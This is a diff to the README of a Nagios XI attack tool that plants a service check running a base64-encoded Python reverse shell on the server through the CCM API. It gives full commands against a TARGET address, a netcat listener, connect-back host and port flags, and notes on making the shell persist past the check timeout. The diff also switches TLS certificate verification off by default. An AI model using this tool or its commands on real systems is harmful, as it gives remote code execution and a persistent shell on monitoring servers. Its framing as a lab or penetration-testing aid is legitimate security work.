@@ -50,35 +50,44 @@ python3 nagios_ccm_rshell.py cleanup
 |--------------------|---------------------------------|-----------------------------------------|
 | `--lhost`          | `127.0.0.1`                     | connect back address, reachable from the Nagios server |
 | `--lport`          | `4444`                          |                                         |
-| `--host`           | `localhost`                     | host object to attach the service to    |
+| `--monitored-host` | `localhost`                     | existing Nagios host OBJECT to attach to — **not** the server address (alias: `--host`) |
 | `--service`        | `Reverse Shell Test`            | service description                      |
 | `--command`        | `lab_rshell`                    | CCM command name                        |
-| `--url`            | `http://127.0.0.1:8080/nagiosxi`| XI base URL (env `NAGIOSXI_URL`)        |
+| `--url`            | `http://127.0.0.1:8080/nagiosxi`| XI base URL — **must include `/nagiosxi`** (env `NAGIOSXI_URL`) |
 | `--apikey`         | nagiosadmin key                 | env `NAGIOSXI_APIKEY`                    |
 | `--check-interval` | `5`                             | service check interval (minutes)        |
-| `-k, --insecure`   | off                             | skip TLS verify (https / Burp CA)       |
+| `--verify-tls`     | off (certs ignored)             | verify the server TLS cert; off by default so self-signed certs just work |
 | `--proxy`          | env `NAGIOSXI_PROXY`            | route API traffic through a proxy        |
 | `--burp`           | off                             | shorthand for `--proxy http://127.0.0.1:8080` |
 | `-v, --verbose`    | off                             | print each request                       |
 
 ### Examples
 
+Two flags people trip on:
+- **`--url`** is the XI web base and **must include the `/nagiosxi` path**
+  (e.g. `http://TARGET/nagiosxi`). Point it at the same address you log in at.
+- **`--monitored-host`** is an existing Nagios **host object** to hang the
+  service on (like `localhost`) — it is *not* the server's address.
+
+TLS cert verification is off by default, so `https://` with a self-signed cert
+works without extra flags.
+
 ```bash
 # full run, everything explicit (username/password auth) — start a listener first:
 #   nc -lvnp 4444
-python3 nagios_ccm_rshell.py all --username nagiosadmin --password '<password>' --host localhost --service "Reverse Shell Test" --command lab_rshell --template generic-service --contact-group xi_roles_1 --lhost 127.0.0.1 --lport 4444
+python3 nagios_ccm_rshell.py all --url http://TARGET/nagiosxi --username nagiosadmin --password '<password>' --monitored-host localhost --service "Reverse Shell Test" --command lab_rshell --template generic-service --contact-group xi_roles_1 --lhost <your-ip> --lport 4444
 
 # tear it down afterwards (prompts for the password):
-python3 nagios_ccm_rshell.py cleanup --host localhost --service "Reverse Shell Test" --command lab_rshell --username nagiosadmin
+python3 nagios_ccm_rshell.py cleanup --url http://TARGET/nagiosxi --monitored-host localhost --service "Reverse Shell Test" --command lab_rshell --username nagiosadmin
 
 # catch from another machine on a custom port
 python3 nagios_ccm_rshell.py all --lhost 10.0.0.5 --lport 9001
 
 # attach to a different host/service name
-python3 nagios_ccm_rshell.py setup --host localhost --service "Disk Check" --command disk_rshell
+python3 nagios_ccm_rshell.py setup --monitored-host localhost --service "Disk Check" --command disk_rshell
 
-# point at another XI instance over https with a self-signed cert
-python3 nagios_ccm_rshell.py all --url https://10.0.0.5/nagiosxi -k --apikey <APIKEY> --lhost 10.0.0.1
+# https target with a self-signed cert (TLS ignored by default)
+python3 nagios_ccm_rshell.py all --url https://TARGET/nagiosxi --apikey <APIKEY> --lhost 10.0.0.1
 
 # clean up a custom-named run
 python3 nagios_ccm_rshell.py cleanup --service "Disk Check" --command disk_rshell
@@ -89,7 +98,7 @@ python3 nagios_ccm_rshell.py cleanup --service "Disk Check" --command disk_rshel
 ```bash
 python3 nagios_ccm_rshell.py all --proxy http://127.0.0.1:8081
 python3 nagios_ccm_rshell.py fire --burp          # shorthand for 127.0.0.1:8080
-python3 nagios_ccm_rshell.py all --url https://... --burp -k   # https target, trust Burp CA
+python3 nagios_ccm_rshell.py all --url https://... --burp   # https target (TLS ignored by default)
 ```
 
 Env form:
@@ -104,4 +113,4 @@ python3 nagios_ccm_rshell.py all
 - Payload is a base64'd Python reverse shell run via `setsid`, so it survives Nagios reaping the check at `service_check_timeout` (60s). It runs as the `nagios` user, cwd `/tmp`.
 - `command_line` avoids `;` and `$` (nagios config comment / macro characters).
 - After `setup`, `fire` retries while the core finishes reloading.
-- API key / credentials: `CREDENTIALS.txt`.
+- TLS certificate verification is off by default (self-signed certs just work); pass `--verify-tls` to enforce it.
